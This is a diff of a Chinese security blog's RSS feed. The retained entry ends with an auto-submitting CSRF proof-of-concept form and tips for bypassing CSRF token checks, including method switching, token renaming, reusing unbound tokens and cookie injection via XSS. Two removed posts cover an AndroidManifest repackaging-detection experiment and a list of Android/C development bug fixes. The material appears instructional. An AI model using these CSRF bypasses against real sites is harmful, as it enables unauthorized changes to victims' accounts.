 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;script&amp;gt;history.pushState (&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;/&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;form action=&amp;quot;URL&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;email&amp;quot; value=&amp;quot;EMAIL_ADDRESS&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit request&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      document.forms [0].submit ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
 &lt;li&gt;有的网页会检查 token，但更换下请求方式可能能绕过。&lt;/li&gt;
 &lt;li&gt;更改要检查的 token 名可能也能绕过。&lt;/li&gt;
-&lt;li&gt;可以考虑有的网站生成 token 后，没有和当前用户 session 绑定，因此如果当前 token 没有用于验证，可能会在后台持续存在。因此可以截获一段 request 并复制其 token，之后 drop 掉该 request，此时这段 token 便可用于 CSRF 包的构筑 ，因为没有与我的 session，victim 便&lt;br /&gt;
-可以用这个 token 修改他自己的包。&lt;/li&gt;
+&lt;li&gt;可以考虑有的网站生成 token 后，没有和当前用户 session 绑定，因此如果当前 token 没有用于验证，可能会在后台持续存在。因此可以截获一段 request 并复制其 token，之后 drop 掉该 request，此时这段 token 便可用于 CSRF 包的构筑 ，因为没有与我的 session，victim 便可以用这个 token 修改他自己的包。&lt;/li&gt;
 &lt;li&gt;如果 token 与用户的 cookie 绑定，而用的 request 修改 session 后可能会导致用户退出，但修改 cookie 不会，则 cookie 可能并未与 session 绑定，因此可以尝试用 xss 漏洞配合 set-cookie 修改用户的 cookie，使其与自己的 payload 中的 token 一致。&lt;/li&gt;
 &lt;/ol&gt;
  ]]></description>
@@ -728,75 +987,6 @@ Context Manager 还提供用于 Android 内的各种系统服务信息。应用�
 5. 关键文件检测。&lt;br /&gt;
 6. 调试端口检测。&lt;br /&gt;
 7. 进程名称检测。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/03/01/Androidmanifest-modify-2022.3.1-1/</guid>
-            <title>Androidmanifest 修改实践</title>
-            <link>http://ericcd.com/2022/03/01/Androidmanifest-modify-2022.3.1-1/</link>
-            <category term="Android逆向实践" scheme="http://ericcd.com/categories/Android%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/" />
-            <category term="ddms" scheme="http://ericcd.com/tags/ddms/" />
-            <category term="Android逆向" scheme="http://ericcd.com/tags/Android%E9%80%86%E5%90%91/" />
-            <category term="apktool" scheme="http://ericcd.com/tags/apktool/" />
-            <category term="jarsign" scheme="http://ericcd.com/tags/jarsign/" />
-            <category term="010Editor" scheme="http://ericcd.com/tags/010Editor/" />
-            <category term="Android Studio" scheme="http://ericcd.com/tags/Android-Studio/" />
-            <pubDate>Tue, 01 Mar 2022 21:09:53 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;在网上看见通过修改 Androidmanifest 来识别 apk 是否被重打包的方法，进行一次实践进行验证。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;工具准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具准备&#34;&gt;#&lt;/a&gt; 工具准备&lt;/h1&gt;
-&lt;p&gt;本次实践使用 Android Studio 编写实验代码，通过 010Editor 对 Androidmanifest 文件进行修改，使用 jarsign 对修改后的 apk 进行签名。另外，还会使用到 apktool 来对修改后的 apk 进行重打包，进而判断 apktool 是否会对 apk 造成影响。本次实践还使用到了 ddms 来查看日志输出，判断关键代码是否被触发。&lt;/p&gt;
-&lt;h1 id=&#34;实践过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实践过程&#34;&gt;#&lt;/a&gt; 实践过程&lt;/h1&gt;
-&lt;p&gt;通过 Android Studio 编写 apk，为了实施方便，代码中仅包含.MainActivity 与.appApplication。其中，.appApplication 作为 application 中的 andtoid:name 标签值，其功能为输出一段日志信息。&lt;br /&gt;
-进行第一次测试，ddms 能够准确捕获到该日志信息，确定函数顺利执行。&lt;br /&gt;
-使用 Bandizip 提取 apk 中的 Androidmanifest.xml 文件（尝试过使用 winrar，但是该工具会破坏 apk 结构，造成无法进一步实验），使用 010Editor 对 Androidmanifest 进行修改，主要是对 stringChunk 与 resourceChunk 修改，将两段中存储的变量个数对齐，并将 string 值设置为 name，resourceID 设置为 0 (因为在 Android 标签的结构体中，使用同一索引值来寻找字符串与资源 ID。并且，不要动本来就有的 name 标签与 ID，后面的其它资源可能会用到，改了会报错)。此外，还要对 filesize 等部分进行相应的修改，此处不一一讨论。&lt;br /&gt;
-将修改后的 Androidmanifest 放回 apk 中，删去 META-INF 文件，使用之前的签名文件 (keys.jks) 来对 apk 重新签名，签名使用到了 jarsign 工具，命令如下所示：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ jarsigner -keystore keys.jks -signedjar appsigned.apk appunsigned.apk key0 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;之后将重新签名完成的 apk 放入模拟器运行，ddms 没有接收到任何日志信息，可以发现.appApplication 未被执行。&lt;br /&gt;
-使用 apktool 对 apk 进行重打包，再将生成的 apk 放入模拟器运行，ddms 再次接收到日志信息。&lt;/p&gt;
-&lt;h1 id=&#34;结论&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结论&#34;&gt;#&lt;/a&gt; 结论&lt;/h1&gt;
-&lt;p&gt;Android 在运行时使用 ID 来寻找资源，当资源 ID 违法时 (本次实践中值为 0)，Android 会忽略该 ID 对应的资源 (本次实践中的.appApplication)。但是一旦使用 apktool 对 apk 进行重打包，apktool 会对 Androidmanifest 进行修复，将非法 ID 改为正常 ID，使得.appApplication 能够重新运行。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/02/28/bugs/</guid>
-            <title>日常遇到的 BUG 及其修复方式</title>
-            <link>http://ericcd.com/2022/02/28/bugs/</link>
-            <category term="BUG修复" scheme="http://ericcd.com/categories/BUG%E4%BF%AE%E5%A4%8D/" />
-            <category term="bugs" scheme="http://ericcd.com/tags/bugs/" />
-            <pubDate>Mon, 28 Feb 2022 23:15:24 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录遇到过的 bug。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;打开-monitorbat-时报错an-error-occured&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#打开-monitorbat-时报错an-error-occured&#34;&gt;#&lt;/a&gt; 打开 monitor.bat 时报错：An error occured。&lt;/h1&gt;
-&lt;p&gt;jdk 版本太高了，改成了 1.8 版本顺利运行。&lt;/p&gt;
-&lt;h1 id=&#34;夜神模拟器无法自动连接-android-studio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#夜神模拟器无法自动连接-android-studio&#34;&gt;#&lt;/a&gt; 夜神模拟器无法自动连接 Android Studio。&lt;/h1&gt;
-&lt;p&gt;切换到夜神模拟器安装目录下的 bin 文件夹，执行以下指令：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ adb connect 127.0.0.1:62001&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;使用-android-killer-重打包失败&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-android-killer-重打包失败&#34;&gt;#&lt;/a&gt; 使用 Android Killer 重打包失败&lt;/h1&gt;
-&lt;p&gt;更换成最新的 apktool。&lt;/p&gt;
-&lt;h1 id=&#34;找不到-ddms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找不到-ddms&#34;&gt;#&lt;/a&gt; 找不到 ddms&lt;/h1&gt;
-&lt;p&gt;ddms 已经更名成 monitor，并且使用前最好将 java 版本降为 javaSE1.8，否则可能报错。&lt;/p&gt;
-&lt;h1 id=&#34;使用-ddms-查看不了夜神模拟器的日志输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-ddms-查看不了夜神模拟器的日志输出&#34;&gt;#&lt;/a&gt; 使用 ddms 查看不了夜神模拟器的日志输出&lt;/h1&gt;
-&lt;p&gt;换成雷神模拟器。&lt;/p&gt;
-&lt;h1 id=&#34;使用-android-studio-时代码补全功能消失&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-android-studio-时代码补全功能消失&#34;&gt;#&lt;/a&gt; 使用 Android Studio 时代码补全功能消失&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;关闭省电模式。&lt;/li&gt;
-&lt;li&gt;重新进行以便 Grald Sync&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h1 id=&#34;在-android-studio-中加载动态库时提示找不到动态库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在-android-studio-中加载动态库时提示找不到动态库&#34;&gt;#&lt;/a&gt; 在 Android studio 中加载动态库时提示找不到动态库&lt;/h1&gt;
-&lt;p&gt;在 build.gralde 中的 android {} 里添加以下代码。&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$      sourceSets &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$                             main&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$                                         jniLibs.srcDirs=[&amp;#x27;src/main/libs&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$                                      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$                           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;提示在动态库中找不到函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提示在动态库中找不到函数&#34;&gt;#&lt;/a&gt; 提示在动态库中找不到函数&lt;/h1&gt;
-&lt;p&gt;确定动态库已经加载，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1qdnZ4cy5zbw==&#34;&gt;检查.so&lt;/span&gt; 文件，发现其中没有我自己编写的代码。查看 ndk-build 的 log，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1waHFzM2xrNGpxMmRodmE1MDJiczdiZDRvOXdmYjRkZTY5ZG53eWIuc28=&#34;&gt;发现虽然没报错且正常生成.so&lt;/span&gt; 文件，但是没有编译.c 文件的步骤。检查 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FuZHJvaWQubWs=&#34;&gt;Android.mk&lt;/span&gt; 文件，发现 LOCAL_SRC_FILES 标签少写了最后的 S，导致 ndk-build 没有编译指定文件。&lt;/p&gt;
-&lt;h1 id=&#34;使用-ndk-build-编译时提示-jniexport-后面缺少符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-ndk-build-编译时提示-jniexport-后面缺少符号&#34;&gt;#&lt;/a&gt; 使用 ndk-build 编译时提示 JNIEXPORT 后面缺少；符号&lt;/h1&gt;
-&lt;p&gt;自动生成的.h 文件中，函数定义末尾少了；符号，加上就不报错了。&lt;/p&gt;
-&lt;h1 id=&#34;使用-frida-dexdump-脱壳时报错script-has-been-destroyed&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-frida-dexdump-脱壳时报错script-has-been-destroyed&#34;&gt;#&lt;/a&gt; 使用 Frida-dexdump 脱壳时报错：script has been destroyed&lt;/h1&gt;
-&lt;p&gt;可能是框架问题，但在本次实践中是由于 app 不稳定崩溃导致的。&lt;/p&gt;
-&lt;h1 id=&#34;使用-class-结构时发现该结构实际长度比其中的数据长度长&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-class-结构时发现该结构实际长度比其中的数据长度长&#34;&gt;#&lt;/a&gt; 使用 class 结构时，发现该结构实际长度比其中的数据长度长&lt;/h1&gt;
-&lt;p&gt;因为编译器按照 4 字节对 class 进行对齐，不足的补 0，可以在代码开头加上以下声明来取消对齐。&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  pragma pack (1)  // 按照 1 字节对齐，等于没对齐。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;使用-malloc-分配空间后向其中写入-char但是发现-cout-时后续跟了许多脏字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-malloc-分配空间后向其中写入-char但是发现-cout-时后续跟了许多脏字符&#34;&gt;#&lt;/a&gt; 使用 malloc 分配空间后，向其中写入 char，但是发现 cout 时后续跟了许多脏字符&lt;/h1&gt;
-&lt;p&gt;如果 malloc 申请的空间长度等于需要写入的字符长度，那么 cout 时在字符末尾找不到终止符，会继续读，直到遇见终止符为止。建议使用 calloc 来分配空间，该函数能将分配的空间初始化为 0，并且申请的空间长度应该为字符长度 + 1。&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
